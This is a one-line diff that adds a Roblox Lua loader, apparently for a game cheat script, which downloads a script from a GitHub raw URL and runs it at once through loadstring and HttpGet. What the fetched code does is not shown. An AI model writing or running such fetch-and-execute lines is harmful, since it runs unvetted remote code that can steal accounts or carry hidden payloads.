@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/mikebornd-cell/Happy-scrp/refs/heads/main/HVW%20SCRT.txt"))()
